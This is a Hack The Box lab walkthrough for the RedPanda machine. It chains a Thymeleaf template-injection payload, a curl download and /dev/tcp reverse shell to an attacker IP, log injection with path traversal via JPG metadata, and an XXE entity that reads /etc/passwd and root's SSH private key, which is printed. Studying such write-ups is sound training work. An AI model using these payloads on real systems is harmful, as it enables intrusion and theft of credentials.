---
title: HTB: RedPanda
url: https://0xdf.gitlab.io/2022/11/26/htb-redpanda.html
date: 2022-11-26T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, htb-redpanda, hackthebox, nmap, springboot, ssti, feroxbuster, wfuzz, filter, thymeleaf, burp, burp-repeater, pspy, java, xxe, groups, directory-traversal
---

![RedPanda](https://0xdfimages.gitlab.io/img/redpanda-cover.png)

RedPanda starts with a SSTI vulnerability in a Java web application. I’ll exploit that to get execution and a shell. To get to root, I’ll abuse another Java application that’s running as root to assign credit to various authors. To abuse this, I’ll generate a complex attack chain that starts by injecting a log that points to a malicious JPG image I generate. That JPG has metadata that exploits a directory traversal to point to unintended XML, where I can do an XML external entity attack to read files as root. With that abililty, I’ll read root’s private SSH key. In Beyond Root, I’ll look at why my reverse shell as the first user and an SSH session as that user has access to different groups.

## Box Info

| Name | [RedPanda](https://hackthebox.com/machines/redpanda)  [RedPanda](https://hackthebox.com/machines/redpanda) [Play on HackTheBox](https://hackthebox.com/machines/redpanda) |
| --- | --- |
| Release Date | [09 Jul 2022](https://twitter.com/hackthebox_eu/status/1545060118575734784) |
| Retire Date | 26 Nov 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for RedPanda |
| Radar Graph | Radar chart for RedPanda |
| First Blood User | 00:02:17[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 00:46:14[irogir irogir](https://app.hackthebox.com/users/476556) |
| Creator | [Woodenk Woodenk](https://app.hackthebox.com/users/25507) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (8080):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.170
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-21 19:58 UTC
Nmap scan report for 10.10.11.170
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
oxdf@hacky$ nmap -p 22,8080 -sCV 10.10.11.170
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-21 19:58 UTC
Nmap scan report for 10.10.11.170
Host is up (0.086s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 21 Nov 2022 19:58:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
...[snip]...
_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
...[snip]...
SF:l>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.73 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu focal 20.04. There’s no server header identified in the HTTP response, but the title does say that the site is build on Sprint Boot.

### Website - TCP 80

#### Site

The page is a search engine for red panda pictures:

![image-20221121150814819](https://0xdfimages.gitlab.io/img/image-20221121150814819.png)

Searching for a string like “0xdf” returns nothing:

![image-20221121150856968](https://0xdfimages.gitlab.io/img/image-20221121150856968.png)

If I just search for “a” it finds four:

![image-20221121150929452](https://0xdfimages.gitlab.io/img/image-20221121150929452.png)

Each panda has a picture, a name, a bio, and an author. The author is a link, which goes to an author’s page:

![image-20221121151044537](https://0xdfimages.gitlab.io/img/image-20221121151044537.png)

It’s tracking the number of views each panda gets. The “Export table” link goes to `/export.xml?author=damian`, and returns an XML document:

```

<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>

```

#### Tech Stack

The HTTP response headers don’t show a server such as Apache or NGINX:

```

HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Mon, 21 Nov 2022 20:05:55 GMT
Connection: close
Content-Length: 1543

```

Given the title saying that the site is built on Spring Boot, this is like a Java website using the [Spring Boot](https://spring.io/projects/spring-boot) framework.

Fuzzing the search input a bit will crash the application. For example, it seems that if there’s an open `{` without a closing `}`, it returns an error page:

![image-20221121152818540](https://0xdfimages.gitlab.io/img/image-20221121152818540.png)

A quick Google shows this is associated with Spring Boot:

![image-20221121153020360](https://0xdfimages.gitlab.io/img/image-20221121153020360.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x java,class` to look for Java files:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.170:8080 -x java,class

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.170:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [java, class]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       55l      119w        0c http://10.10.11.170:8080/
200      GET       32l       97w        0c http://10.10.11.170:8080/stats
405      GET        1l        3w        0c http://10.10.11.170:8080/search
500      GET        1l        1w        0c http://10.10.11.170:8080/error
[####################] - 5m    180000/180000  0s      found:4       errors:0      
[####################] - 5m     90000/90000   267/s   http://10.10.11.170:8080 
[####################] - 5m     90000/90000   267/s   http://10.10.11.170:8080/ 

```

The identified paths match what I’ve already seen enumerating the site.

## Shell as woodenk

### SSTI

#### Banned Characters

If I try to enter an SSTI payload like `${7*7}`, the site returns an error:

![image-20221121155502494](https://0xdfimages.gitlab.io/img/image-20221121155502494.png)

To see what’s banned, I’ll use `wfuzz` to just submit single characters from a wordlist in [SecLists](https://github.com/danielmiessler/SecLists). The `--ss banned` will filter to only show responses that contain the string “banned”:

```

oxdf@hacky$ wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.170:8080/search
Total requests: 95

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000004:   200        28 L     69 W     755 Ch      "$"
000000063:   200        28 L     69 W     755 Ch      "_"
000000094:   200        28 L     69 W     755 Ch      "~"

Total time: 1.417720
Processed Requests: 95
Filtered Requests: 92
Requests/sec.: 67.00898

```

It looks like three single characters that are blocked (there could be more multi-character patterns as well, but this is a good start).

#### Identify SSTI

The default templating language for Spring Boot is Thymeleaf. [This article](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/) goes into some detail on hacking Thymeleaf, and I really like this part that shows the different kinds of expressions:

![image-20221121160306857](https://0xdfimages.gitlab.io/img/image-20221121160306857.png)

The first and last will trigger the banned list, but I can try the others. For example `*{7*7}` works:

![image-20221121160417155](https://0xdfimages.gitlab.io/img/image-20221121160417155.png)

`@{7*7}` return the same. `#{7*7}` also works, returning a bit more junk:

![image-20221121160444324](https://0xdfimages.gitlab.io/img/image-20221121160444324.png)

#### RCE POC

The payload from the article above is `${T(java.lang.Runtime).getRuntime().exec('calc')}`. I’ll change the leading `$` to `*` and instead of running `calc`, try `id`:

![image-20221121160624067](https://0xdfimages.gitlab.io/img/image-20221121160624067.png)

It looks like the command executed, but I don’t get a response. I can try to `ping` my host with `*{T(java.lang.Runtime).getRuntime().exec('ping -c 1 10.10.14.6')}`, and it works:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:07:24.116693 IP 10.10.11.170 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
21:07:24.116743 IP 10.10.14.6 > 10.10.11.170: ICMP echo reply, id 2, seq 1, length 64

```

Alternatively, there are payloads that return the result, such as the one on the [HackTricks SSTI page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java):

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

```

Pasting that into the search box verbatim shows the output of `id`:

![image-20221121160855128](https://0xdfimages.gitlab.io/img/image-20221121160855128.png)

### Shell

#### curl POC

Given the complication of this payload, I’ll use `curl` to read a file from my VM and if that works, try to pipe it into `bash`. I’ll go into Burp proxy and find the POC `id` request above. I’ll send that request to repeater, and change that `id` to `curl 10.10.14.6/shell`. With a `python` web server running, I’ll submit the request, and there’s a request at my webserver:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [21/Nov/2022 21:11:51] code 404, message File not found
10.10.11.170 - - [21/Nov/2022 21:11:51] "GET /shell HTTP/1.1" 404 -

```

#### Pipe Fails

I’ll add a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to `shell`:

```

#!/bin/bash

bash >& /dev/tcp/10.10.14.6/443 0>&1

```

Trying to pipe this into `bash` results in this request:

```
10.10.11.170 - - [21/Nov/2022 21:15:35] code 404, message File not found
10.10.11.170 - - [21/Nov/2022 21:15:35] "GET /shell|bash HTTP/1.1" 404 -

```

It is interpreting the `|` as part of the request, not as a pipe.

#### Save and Execute

I’ll just write the shell to `/tmp`:

![image-20221121161652572](https://0xdfimages.gitlab.io/img/image-20221121161652572.png)

This seems to work. Next I’ll run it with `bash`:

![image-20221121161909384](https://0xdfimages.gitlab.io/img/image-20221121161909384.png)

On doing that, there’s a connection at my `nc` listener:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.170 45524

```

This is why I always run with `-v`, so it alerts me to the connection, even though no prompt was sent over the session. It still works:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.170 45524
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)

```

I’ll upgrade the shell using `script` and `stty` (explained [here](https://www.youtube.com/watch?v=DqE6DxqJg8Q)):

```

script /dev/null -c bash
Script started, file is /dev/null
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

```

From here I can grab `user.txt`:

```

woodenk@redpanda:~$ cat user.txt
8080a73c************************

```

## Shell as root

### Enumeration

#### logs Group

The current user is in the `logs` group:

```

woodenk@redpanda:/tmp$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)

```

Interestingly, the user is actually not in that group, but the process from which the shell was generated is. This leads to a discrepancy between a shell gained via SSTI in the web application and using SSH (I’ll explore this in [Beyond Root](#beyond-root---groups)).

Looking for files owned by this group, I’ll remove lines in `/proc`, `/tmp`, and in the `/home/woodenk/.m2` directory:

```

woodenk@redpanda:/$ find / -group logs 2>/dev/null | grep -v -e '^/proc' -e '\.m2' -e '^/tmp/'
/opt/panda_search/redpanda.log
/credits
/credits/damian_creds.xml
/credits/woodenk_creds.xml

```

`/credits` is readable by `logs` but only writable by root:

```

woodenk@redpanda:/$ find /credits -ls
    81946      4 drw-r-x---   2 root     logs         4096 Jun 21 12:32 /credits
    22780      4 -rw-r-----   1 root     logs          422 Nov 21 23:38 /credits/damian_creds.xml
    22800      4 -rw-r-----   1 root     logs          426 Nov 21 23:38 /credits/woodenk_creds.xml

```

#### /opt

`/opt` has all the interesting stuff for this box:

```

woodenk@redpanda:/opt$ ls
cleanup.sh  credit-score  maven  panda_search

```

There are two Java applications, `panda_search` and `credit-score`. I’ll analyze each below. There’s also a file named `cleanup.sh`:

```

#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;

```

This is removing `.xml` and `.jpg` files from a bunch of directories. I don’t need to know this to solve, but it’s a good hints that these are the kinds of files that matter. Presumably this is running periodically on a cron.

#### Processes

To look for running processes, I’ll upload [pspy](https://github.com/DominicBreuker/pspy) by starting a Python server in that directory and using `wget` from my shell on RedPanda. Every two minutes there’s a cron that runs `/root/run_credits.sh` which seems to run `/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar` as root.

```

2022/11/21 23:42:01 CMD: UID=0    PID=4700   | /usr/sbin/CRON -f 
2022/11/21 23:42:01 CMD: UID=0    PID=4702   | /bin/sh /root/run_credits.sh 
2022/11/21 23:42:01 CMD: UID=0    PID=4701   | /bin/sh -c /root/run_credits.sh 
2022/11/21 23:42:01 CMD: UID=0    PID=4703   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 

```

`/opt/cleanup.sh` seems to run every five minutes as well.

### Web Application

The web application source is located in `/opt/panda_search`:

```

woodenk@redpanda:/opt/panda_search$ ls
mvnw  mvnw.cmd  pom.xml  redpanda.log  src  target

```

There’s a few `.java` files:

```

woodenk@redpanda:/opt/panda_search$ find . -name '*.java'
./.mvn/wrapper/MavenWrapperDownloader.java
./src/test/java/com/panda_search/htb/panda_search/PandaSearchApplicationTests.java
./src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java
./src/main/java/com/panda_search/htb/panda_search/MainController.java
./src/main/java/com/panda_search/htb/panda_search/PandaSearchApplication.java

```

I’ll skip the `MavenWrapperDownloader.java` and the tests for now.

`MainController.java` defines some of the different web routes in the page, `/stats`, `/export.xml`, `/search`. I’ll note that the `/stats` route is getting data from `/credits/[author]_creds.xml`:

```

                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List<Element> images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }     

```

There’s a `searchPanda` function that connects to the database:

```

    public ArrayList searchPanda(String query) {
                                               
        Connection conn = null;               
        PreparedStatement stmt = null;                                                         
        ArrayList<ArrayList> pandas = new ArrayList();
        try {                                
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();      
            while(rs.next()){            
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));          
                panda.add(rs.getString("bio")); 
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }                                                                                  
        }catch(Exception e){ System.out.println(e);}
        return pandas;         
    }

```

I’ll note those credentials, woodenk / RedPandazRule. They work for SSH to the box as the same user, but I don’t need them, and an SSH shell won’t have the `logs` group (see [Beyond Root](#beyond-root---groups)).

`PandaSearchApplication.java` just sets up the SpringBoot application:

```

package com.panda_search.htb.panda_search;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

@SpringBootApplication
public class PandaSearchApplication extends WebMvcConfigurerAdapter{
        @Override
        public void addInterceptors (InterceptorRegistry registry) {
                registry.addInterceptor(new RequestInterceptor());
        }

        public static void main(String[] args) {
                SpringApplication.run(PandaSearchApplication.class, args);
        }

}

```

`RequestInterceptor` generates logging on each request:

```

public class RequestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("interceptor#preHandle called. Thread: " + Thread.currentThread().getName());
        return true;
    }

    @Override
    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
}

```

It writes to `/opt/panda_search/redpanda.log` in the format of:

```

[response code]||[remote address]||[user agent]||[request uri]

```

### credit-score

There’s another application in `/opt` named `credit-score`:

```

woodenk@redpanda:/opt$ find credit-score/ -type f
credit-score/LogParser/final/pom.xml.bak
credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
credit-score/LogParser/final/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst
credit-score/LogParser/final/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst
credit-score/LogParser/final/target/classes/com/logparser/App.class
credit-score/LogParser/final/.mvn/wrapper/maven-wrapper.jar
credit-score/LogParser/final/.mvn/wrapper/maven-wrapper.properties
credit-score/LogParser/final/.mvn/wrapper/MavenWrapperDownloader.java
credit-score/LogParser/final/pom.xml
credit-score/LogParser/final/mvnw
credit-score/LogParser/final/src/test/java/com/logparser/AppTest.java
credit-score/LogParser/final/src/main/java/com/logparser/App.java

```

There’s a `.jar` file in there, which is the compiled Java application. The interesting source file here is `App.java`. The `main` function is opening `/opt/panda_search/redpanda.log` (the file being written to above) and passing it to `parseLog`:

```

    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }

```

`parseLog` is reading that file and splitting on `||`:

```

    public static Map parseLog(String line) {                      
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();                                 
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);                                 
        map.put("user_agent", strings[2]);                         
        map.put("uri", strings[3]);

        return map;                                                
    }  

```

After parsing a line of the log, `main` calls `getArtist` to get the artist name associated with the image.

```

    public static String getArtist(String uri) throws IOException, JpegProcessingException                                             
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {                                                          
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {                                                  
                    return tag.getDescription();
                }                                                  
            }                                                      
        }                                                          
        return "N/A";                                              
    }   

```

This function is using the “Artist” tag name in the image metadata as the artist. I can check this by downloading one of the images from the site and using `exiftool` to get the metadata:

```

oxdf@hacky$ exiftool smooch.jpg | grep Artist
Artist                          : woodenk

```

`main` uses the artist name to generate a path to a `[artist name]_creds.xml` file, which is passes along with the URI to `addViewTo`.

`addViewTo` parses the XML, increments the view count for that image, and then writes the file back:

```

    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());
                                                                   
        File fd = new File(path);
        Document doc = saxBuilder.build(fd);
        Element rootElement = doc.getRootElement();
        for(Element el: rootElement.getChildren())
        {
            if(el.getName() == "image")                            
            {                                                      
                if(el.getChild("uri").getText().equals(uri))
                {                                                  
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));

rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }                                                  
            }
        }                                                          
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);                             
    } 

```

### Injection / XXE File Read

#### Strategy

My goal here is to pass a file completely under my control into the `addViewTo` function. If I control that file, I can use XML external entity (XXE) injection to read files as root (the user running the process).

To control the path to the XML file, I’ll need to control the username, which is fetched from the `Artist` metadata from the JPG associated with the URI from the log.

To get it to point to my JPG, I’ll inject into the log using the User-Agent to control the URI variable abusing how it splits on `||`.

![image-20221122072139171](https://0xdfimages.gitlab.io/img/image-20221122072139171.png)

#### XXE Payload

I’ll start with the downloaded `export.xml` from `/export.xml`, saving it as `0xdf_creds.xml`. I’ll add an XXE payload:

![image-20221122070855427](https://0xdfimages.gitlab.io/img/image-20221122070855427.png)

This defines an entity `foo` that is the contents of a file. When the program processes this, the `<root>` field should get the contents of `/etc/passwd`, and then that’s written back to the file.

#### Image

I’ll download one of the images from the site and name it `0xdf.jpg`. I’ll update the metadata using `exiftool` so that the path the program looks for finds `0xdf_creds.xml` and not one of the intended ones:

```

oxdf@hacky$ cp florida.jpg 0xdf.jpg 
oxdf@hacky$ exiftool -Artist="../tmp/0xdf" 0xdf.jpg 
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - 0xdf.jpg
    1 image files updated
oxdf@hacky$ exiftool 0xdf.jpg | grep Artist
Artist                          : ../tmp/0xdf

```

#### Malicious Log

To inject into the logs, I could figure out how to make requests that get logged and then modify my user-agent with `||` to give control over the uri field, but that’s not necessary, as the log file is writable by the logs group:

```

woodenk@redpanda:/opt/panda_search$ ls -l redpanda.log 
-rw-rw-r-- 1 root logs 1 Nov 22 11:48 redpanda.log

```

I’ll write a log that points to my image file:

```

woodenk@redpanda:/opt/panda_search$ echo "412||ip||ua||/../../../../../../tmp/0xdf.jpg" >> redpanda.log

```

#### Execute

I’ll upload the two files I created into `/tmp` using `scp` with the creds identified in the web source (though I could also just use a Python webserver and `wget` just as easily):

```

oxdf@hacky$ sshpass -p RedPandazRule scp 0xdf.jpg woodenk@10.10.11.170:/tmp/
oxdf@hacky$ sshpass -p RedPandazRule scp 0xdf_creds.xml woodenk@10.10.11.170:/tmp/

```

The next time the cron runs, it will parse that log, and the `uri` variable will be `/../../../../../../tmp/0xdf.jpg`. That will be used to build a path which is `/opt/panda_search/src/main/resources/static/../../../../../../tmp/0xdf.jpg`, which is effectively `/tmp/0xdf.jpg`.

The program will then read the artist metadata from that image as `../tmp/0xdf` to build the path `/credits/../tmp/oxdf_creds.xml`.

It will load that XML file, and on doing so, the entity in it, reading in the contents of `/etc/passwd`. Then it will increment the `views` field, and write the results back to the same file.

After the next run, I’ll see the results in the file:

![image-20221122085057394](https://0xdfimages.gitlab.io/img/image-20221122085057394.png)

### Shell

#### Collect SSH Key

With the ability to read files as root, I could just read the flag, but in interest of getting a shell, I’ll try to read root’s SSH key. I’ll update the XXE to target the default key name:

```

...[snip]...
<!DOCTYPE root [
<!ENTITY foo SYSTEM 'file:///root/.ssh/id_rsa'>]>
...[snip]...

```

Copy that file up to RedPanda:

```

oxdf@hacky$ sshpass -p RedPandazRule scp 0xdf_creds.xml woodenk@10.10.11.170:/tmp/

```

And inject another log:

```

woodenk@redpanda:/opt/panda_search$ echo "412||ip||ua||/../../../../../../tmp/0xdf.jpg" >> redpanda.log

```

I’ll make sure the JPG is still in place and hasn’t been cleaned up as well.

When the cron next runs, the key is there:

```

woodenk@redpanda:/opt/panda_search$ cat /tmp/0xdf_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
    <root>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</root>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>

```

#### Get Shell

I’ll save that key to a file, and use it to connect over SSH:

```

oxdf@hacky$ vim ~/keys/redpanda-root
oxdf@hacky$ chmod 600 ~/keys/redpanda-root
oxdf@hacky$ ssh -i ~/keys/redpanda-root root@10.10.11.170
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
...[snip]...
root@redpanda:~#

```

And read `root.txt`:

```

root@redpanda:~# cat root.txt
0a5aa61f************************

```

## Beyond Root - Groups

### Reverse Shell vs SSH

There are two ways I can get a shell as woodenk. Initially, I’ll get a foothold using the SSTI in the web application running as woodenk. That shell looks like:

```

woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:~$ groups
logs woodenk

```

I’ll notice the group id is 1001 (logs), and that the process also has group 1000 (woodenk).

When I find woodenk’s password, I can connect over SSH:

```

oxdf@hacky$ sshpass -p RedPandazRule ssh woodenk@10.10.11.170
...[snip]...
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
woodenk@redpanda:~$ groups
woodenk

```

This shell doesn’t have the logs group!

Interestingly, if I run `groups woodenk` from either shell, it returns:

```

woodenk@redpanda:~$ groups woodenk
woodenk : woodenk

```

### groups

The [man page](https://man7.org/linux/man-pages/man1/groups.1.html) for `groups` gives some clues as to what’s going on:

> Print group memberships for each USERNAME or, if no USERNAME is
> specified, for the current process (which may differ if the
> groups database has changed).

When a username is given, it prints the groups associated with that user. In this case, woodenk has the woodenk group, and that’s it.

### sudo

When no username is given, it prints the groups associated with the current process. Typically we think of the groups for a process as the groups of the user that it is running as. But there are other ways to associate users and groups with processes. For example, `su` and `sudo` are both made to run programs as a different user (or group).

Looking at the process list for entries with the Jar file that serves the website, there are three entries:

```

woodenk@redpanda:~$ ps auxww | grep panda_search-0.0.1-SNAPSHOT.jar
root         881  0.0  0.0   2608   596 ?        Ss   Nov21   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         882  0.0  0.2   9416  4292 ?        S    Nov21   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      889  0.9 27.8 3151616 566228 ?      Sl   Nov21  10:35 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar

```

The first is root calling `/bin/sh` with `-c` to run a command.

The second is the result of that, root calling `sudo`. `-u` specifies that the user to run as is woodenk. `-g` specifies the group to run as is logs.

The third line is process id 889, `java` running as woodenk. Looking in `/proc` I can see the groups with that process:

```

woodenk@redpanda:~$ cat /proc/889/status 
Name:   java
Umask:  0002
State:  S (sleeping)
Tgid:   889
Ngid:   0
Pid:    889
PPid:   882
TracerPid:      0
Uid:    1000    1000    1000    1000
Gid:    1001    1001    1001    1001
FDSize: 256
Groups: 1000 1001 
...[snip]...

```